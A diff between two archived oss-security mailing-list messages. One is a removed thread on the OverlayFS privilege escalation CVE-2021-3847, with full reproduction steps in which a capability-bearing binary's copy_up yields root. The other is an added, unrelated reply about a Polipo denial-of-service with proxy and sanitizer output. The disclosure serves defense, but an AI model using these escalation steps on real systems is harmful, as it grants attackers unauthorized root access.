@@ -1,143 +1,74 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/19/3
-Message-ID: <YW7zuLv8TYDNzyqC@mussarela>
-Date: Tue, 19 Oct 2021 13:35:04 -0300
-From: Thadeu Lima de Souza Cascardo <cascardo@...onical.com>
-To: Miklos Szeredi <miklos@...redi.hu>
-Cc: oss-security@...ts.openwall.com, linux-fsdevel@...r.kernel.org, linux-unionfs@...r.kernel.org, Alon Zahavi <Alon.Zahavi@...erark.com>, Vegard Nossum <vegard.nossum@...cle.com>, Nir Chako <Nir.Chako@...erark.com>, Alon Zahavi <zahavi.alon@...il.com>
-Subject: Re: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/08/01/2
+Message-ID: <YQbnc3DxV6iEaA3B@sol.nexus.lan>
+Date: Sun,  1 Aug 2021 18:31:27 +0000
+From: John Helmert III <jchelmert3@...teo.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: Polipo: denial-of-service using range
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Oct 19, 2021 at 05:23:27PM +0200, Miklos Szeredi wrote:
-> On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
-> > 
-> > After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
-> > There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
-> > This vulnerability was attached with CVE-2021-3847.
-> > Here is the report that was initially sent:
-> > 
-> > ## Bug Class
-> > Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
-> > # Technical Details
-> > ## Summary:
-> > An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
-> > ## In details:
-> > If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
-> 
-> I think this is a misunderstanding about how overlayfs operates.  Mounting
-> overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
-> In other words if the admin creates an overlay where the lower layer is
-> untrusted and the upper layer is trusted, then that act itself is the
-> privilege escalation.
-> 
-> This is more formally documented in "Documentation/filesystems/overlayfs.rst"
-> in the "Permission model" section.
-> 
-> If this model is not clear, then maybe it needs to be spelled out more
-> explicitly.  Perhaps even a warning message could be added to the kernel logs
-> in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
-> skipping copy up of certain attributes would make the cure worse than the
-> disease.
+How did you produce this? I can't seem to reproduce with the original
+PoC script. Running it, polipo outputs:
 
-Should we fail (and log it) when the lower mount and upper mount have different
-suid settings, and require a force option to be used?
+Empty DNS name.
+Host (unknown) lookup failed: empty name (22).
 
-Cascardo.
+The script outputs:
 
-> 
-> Let me know if I'm missing something.
-> 
-> Thanks,
-> Miklos
-> 
-> > See attached image.
-> > ## Build:
-> > Any Linux machine with a support for overlayFS.
-> > For example: AWS EC2 Ubuntu 20.04.
-> > Mount a device to any folder.
-> > Copy any file with capabilities into that folder.
-> > Remount the device now with nosuid option.
-> > mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
-> > ## Execution:
-> > As a low-priv user cd into the merged directory.
-> > Execute touch capable_file
-> > cd to the upper layer directory.
-> > Execute the capable binary.
-> > ## Expected Results:
-> > When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
-> > ## Observed Results:
-> > The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
-> > 
-> > 
-> > ########## Example ##########
-> > # there are two mount in question
-> > $ cd /home/user/overlayfs/
-> > 
-> > $ ls -l
-> > drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
-> > drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
-> > drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
-> > drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
-> > drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
-> > 
-> > # there are two mount in question.
-> > # lowerUSB is a mount of an USB, which has a capable file inside.
-> > # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
-> > # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
-> > $ mount
-> > /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
-> > overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
-> > 
-> > # The contents of all the directories.
-> > $ ls -l *
-> > lowerUSB:
-> > total 40
-> > -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
-> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> > 
-> > merge:
-> > total 40
-> > -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
-> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> > 
-> > test:
-> > total 0
-> > 
-> > upper:
-> > total 0
-> > 
-> > work:
-> > total 4
-> > d--------- 2 root root 4096 Sep 19 14:25 work
-> > 
-> > # escalate is an executable that set its uid and gid to 0.
-> > $ getcap ./lowerUSB/escalate
-> > ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
-> > 
-> > $ id
-> > uid=1000(user) gid=1000(user) groups=1000(user)
-> > 
-> > # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
-> > $ ./lowerUSB/escalate
-> > [-] Failure
-> > 
-> > # Try to copy the binary with its capabilities.
-> > # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
-> > $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
-> > cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
-> > 
-> > # Trigger the copy_up
-> > $ touch ./merge/escalate
-> > $ ls -l ./upper/
-> > -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
-> > 
-> > # The copy_up kept the binary capabilities (xattr)
-> > $ getcap ./upper/escalate
-> > ./upper/escalate = cap_setgid,cap_setuid+eip
-> > 
-> > # executing the binary, with the capabilities, so the privileges will escalate to root.
-> > $ ./upper/escalate
-> > $ id
-> > uid=0(root) gid=0(root) groups=0(root)
-> > 
-> > 
+HTTP/1.1 504 Host (unknown) lookup failed: empty name
+Connection: keep-alive
+Date: Sun, 01 Aug 2021 18:07:07 GMT
+Content-Type: text/html
+Content-Length: 515
+Expires: 0
+Cache-Control: no-cache
+Pragma: no-cache
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+<title>Proxy error: 504 Host (unknown) lookup failed: empty name.</title>
+</head><body>
+<h1>504 Host (unknown) lookup failed: empty name</h1>
+<p>The following error occurred while trying to access <strong>http://</strong>:<br><br>
+<strong>504 Host (unknown) lookup failed: empty name</strong></p>
+<hr>Generated Sun, 01 Aug 2021 13:07:07 CDT by Polipo on <em>localhost:8123</em>.
+</body></html>
+
+
+Fixing the script to GET a real website shows a bunch of memory alignment
+issues, but no heap overflow as far as I can tell:
+
+dns.c:1467:5: runtime error: store to misaligned address 0x7ffe1de13c69 for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13c69: note: pointer points here
+ 63 6f 6d  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00
+              ^
+dns.c:1468:5: runtime error: store to misaligned address 0x7ffe1de13c6b for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13c6b: note: pointer points here
+ 6d  00 00 01 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00
+              ^
+dns.c:1554:5: runtime error: load of misaligned address 0x7ffe1de13b69 for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13b69: note: pointer points here
+ 63 6f 6d  00 00 01 00 01 c0 0c 00  01 00 01 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe
+              ^
+dns.c:1555:5: runtime error: load of misaligned address 0x7ffe1de13b6b for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13b6b: note: pointer points here
+ 6d  00 00 01 00 01 c0 0c 00  01 00 01 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe 7f 00
+              ^
+dns.c:1596:9: runtime error: load of misaligned address 0x7ffe1de13b6f for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13b6f: note: pointer points here
+ 00 01 c0 0c 00  01 00 01 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe 7f 00 00  22 3d 00
+             ^
+dns.c:1596:9: runtime error: load of misaligned address 0x7ffe1de13b71 for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13b71: note: pointer points here
+ c0 0c 00  01 00 01 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe 7f 00 00  22 3d 00 00 40
+              ^
+dns.c:1596:9: runtime error: load of misaligned address 0x7ffe1de13b73 for type 'unsigned int', which requires 4 byte alignment
+0x7ffe1de13b73: note: pointer points here
+ 00  01 00 01 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe 7f 00 00  22 3d 00 00 40 60 00
+              ^
+dns.c:1596:9: runtime error: load of misaligned address 0x7ffe1de13b77 for type 'short unsigned int', which requires 2 byte alignment
+0x7ffe1de13b77: note: pointer points here
+ 00 00 fe a7 00  04 5d b8 d8 22 7f 00 00  50 3c e1 1d fe 7f 00 00  22 3d 00 00 40 60 00 00  6b 3c e1
+             ^
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
